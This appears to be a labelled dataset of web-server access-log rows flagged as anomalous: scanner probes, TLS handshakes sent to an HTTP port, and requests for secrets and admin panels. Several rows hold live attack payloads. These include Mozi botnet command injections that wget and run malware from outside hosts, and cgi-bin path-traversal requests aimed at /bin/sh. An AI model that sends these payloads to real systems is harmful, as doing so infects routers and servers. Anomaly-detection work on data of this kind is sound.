ip,date,method,endpoint,status,size,flag
32.184.173.217,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
10.212.185.58,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0,anomaly
80.209.107.207,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0,anomaly
90.247.232.68,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0,anomaly
21.37.28.39,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0,anomaly
130.45.115.51,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
144.114.199.208,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0,anomaly
158.130.96.89,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
178.240.71.238,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
1.223.58.207,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
108.0.97.13,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
216.56.174.167,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
71.60.71.175,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
252.247.10.111,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
223.21.170.73,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0,anomaly
105.127.211.149,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0,anomaly
158.225.103.153,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
111.146.217.229,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
101.94.227.51,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
76.51.119.132,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
202.225.205.145,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0,anomaly
234.219.151.113,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0,anomaly
109.99.14.8,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0,anomaly
212.216.80.3,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
158.131.98.14,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
71.248.182.142,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
71.215.207.14,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0,anomaly
43.175.131.160,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0,anomaly
194.37.215.127,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0,anomaly
4.149.111.33,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0,anomaly
92.180.231.179,19/Nov/2024:20:16:26 +0000,,-,408,,anomaly
166.194.208.11,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0,anomaly
216.3.134.119,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0,anomaly
120.100.207.60,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0,anomaly
241.4.0.214,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0,anomaly
32.154.119.22,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0,anomaly
143.170.169.126,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0,anomaly
165.95.229.78,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0,anomaly
160.74.81.254,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
99.35.234.221,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0,anomaly
174.219.127.104,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0,anomaly
246.75.45.31,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
117.88.15.140,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
59.52.121.202,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0,anomaly
228.128.181.97,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0,anomaly
180.247.57.48,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
36.97.70.210,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0,anomaly
214.166.140.159,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
80.22.81.21,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0,anomaly
78.140.2.153,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
25.183.49.100,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0,anomaly
81.125.155.9,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0,anomaly
234.233.82.55,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0,anomaly
194.112.200.30,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0,anomaly
247.210.139.161,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0,anomaly
142.68.227.214,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
216.111.143.37,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0,anomaly
112.237.127.20,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0,anomaly
228.151.208.197,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0,anomaly
214.167.88.246,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
144.216.41.250,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
233.245.151.49,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0,anomaly
228.213.155.28,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
176.243.55.48,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
79.18.145.21,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0,anomaly
173.176.176.163,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0,anomaly
210.164.30.74,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0,anomaly
194.33.135.193,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0,anomaly
30.20.150.203,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0,anomaly
108.138.2.144,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
150.0.9.36,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
233.130.169.79,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0,anomaly
182.13.157.37,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0,anomaly
89.142.215.168,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
115.156.99.14,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
98.77.196.149,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
56.145.242.185,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
55.67.27.48,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0,anomaly
50.106.149.228,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
48.76.77.29,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0,anomaly
223.17.166.198,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0,anomaly
101.157.111.155,15/Nov/2024:00:35:31 +0000,,-,408,,anomaly
223.118.65.159,15/Nov/2024:00:36:08 +0000,,-,408,,anomaly
239.75.111.215,15/Nov/2024:00:36:30 +0000,,-,408,,anomaly
92.250.179.88,15/Nov/2024:00:36:34 +0000,,stats,400,226.0,anomaly
238.214.241.137,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
253.218.45.92,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0,anomaly
122.240.105.18,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
50.135.176.236,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
70.76.179.84,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0,anomaly
220.242.188.25,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0,anomaly
106.6.15.147,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
206.103.242.103,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
201.207.221.195,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0,anomaly
124.112.86.45,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
212.140.91.56,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0,anomaly
148.10.19.29,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0,anomaly
97.221.132.33,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
10.232.84.22,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
236.16.151.1,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0,anomaly
178.61.85.60,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
209.64.31.180,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0,anomaly
164.167.235.233,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0,anomaly
50.57.88.65,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
238.74.246.200,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
157.27.17.7,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
217.233.77.47,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
220.210.149.33,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,,anomaly
61.192.15.165,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,,anomaly
176.200.163.245,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
201.236.184.206,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0,anomaly
209.166.183.168,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0,anomaly
156.26.135.69,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
207.150.194.242,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0,anomaly
148.200.92.224,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
122.128.142.196,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
98.81.163.72,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
186.55.249.20,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
5.162.1.167,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0,anomaly
189.242.31.177,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0,anomaly
244.72.77.226,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0,anomaly
185.155.202.122,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0,anomaly
168.148.58.251,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
170.215.35.217,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0,anomaly
84.242.55.186,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
113.150.52.129,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
12.212.188.35,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
97.3.190.84,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
7.29.183.108,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
13.250.90.197,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
35.94.67.150,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
59.196.162.73,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0,anomaly
241.53.92.139,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0,anomaly
176.182.237.208,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
128.218.84.80,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
75.188.230.251,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
103.132.231.182,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
179.99.94.11,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0,anomaly
145.184.232.244,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0,anomaly
27.174.242.95,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0,anomaly
66.88.2.53,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
38.96.159.63,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
155.239.167.4,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
126.235.244.125,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0,anomaly
142.59.202.236,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0,anomaly
7.129.6.236,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0,anomaly
68.224.244.249,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0,anomaly
24.149.41.33,19/Nov/2024:20:16:26 +0000,,-,408,,anomaly
242.246.216.69,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0,anomaly
125.161.18.48,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0,anomaly
236.220.77.12,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0,anomaly
135.253.179.162,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0,anomaly
149.130.220.111,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0,anomaly
123.16.135.151,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0,anomaly
9.123.155.168,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0,anomaly
77.123.83.211,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
63.8.243.25,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0,anomaly
24.189.22.149,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0,anomaly
25.145.0.70,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
172.118.67.112,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
200.35.35.231,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0,anomaly
4.116.63.146,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0,anomaly
85.230.8.178,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
242.123.183.51,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0,anomaly
250.103.110.29,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
216.189.248.40,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0,anomaly
153.25.147.165,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
243.169.253.10,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0,anomaly
92.54.105.185,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0,anomaly
124.19.250.45,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0,anomaly
42.108.131.142,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0,anomaly
95.207.35.17,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0,anomaly
147.240.42.38,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
166.106.58.157,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0,anomaly
38.222.225.26,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0,anomaly
201.172.233.14,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0,anomaly
6.33.188.5,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
178.5.156.244,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
227.104.57.220,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0,anomaly
3.205.34.70,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
20.45.247.48,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
146.9.29.114,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0,anomaly
42.82.244.236,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0,anomaly
123.34.136.24,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0,anomaly
35.62.226.172,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0,anomaly
232.169.237.215,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0,anomaly
48.179.137.37,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
137.26.131.151,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
55.121.235.171,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0,anomaly
103.7.154.137,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0,anomaly
185.241.197.212,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
12.23.186.102,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
201.18.54.89,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
137.229.67.132,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
245.240.126.114,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0,anomaly
62.181.80.223,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
94.98.108.29,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0,anomaly
158.19.26.75,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0,anomaly
51.44.152.143,15/Nov/2024:00:35:31 +0000,,-,408,,anomaly
152.125.206.244,15/Nov/2024:00:36:08 +0000,,-,408,,anomaly
148.229.132.207,15/Nov/2024:00:36:30 +0000,,-,408,,anomaly
234.21.104.147,15/Nov/2024:00:36:34 +0000,,stats,400,226.0,anomaly
66.78.166.100,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
74.32.141.77,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0,anomaly
87.157.228.137,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
135.73.67.225,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
57.35.213.152,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0,anomaly
176.52.250.37,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0,anomaly
250.214.26.70,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
6.21.254.139,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
189.13.90.102,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0,anomaly
6.87.23.231,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
188.6.77.114,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0,anomaly
196.182.248.208,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0,anomaly
163.221.224.72,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
170.238.192.117,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
85.249.2.156,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0,anomaly
26.94.65.122,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
163.14.87.99,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0,anomaly
41.122.211.64,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0,anomaly
67.34.79.240,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
25.210.33.94,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
99.201.67.210,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
66.17.228.68,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
5.225.184.169,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,,anomaly
173.88.144.133,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,,anomaly
194.118.100.199,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
182.15.101.32,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0,anomaly
223.208.99.94,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0,anomaly
170.2.98.224,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
65.7.78.112,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0,anomaly
43.202.30.101,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
85.137.118.218,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
190.234.240.216,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
136.204.151.195,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
4.169.108.110,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0,anomaly
84.93.201.97,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0,anomaly
124.146.198.46,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0,anomaly
137.190.133.132,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0,anomaly
97.75.88.33,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
18.164.228.228,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0,anomaly
95.13.214.1,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
28.138.81.99,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
24.206.14.122,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
45.253.146.151,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
3.9.167.95,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
162.67.92.245,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
93.86.40.56,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
108.141.107.134,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0,anomaly
21.63.97.216,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0,anomaly
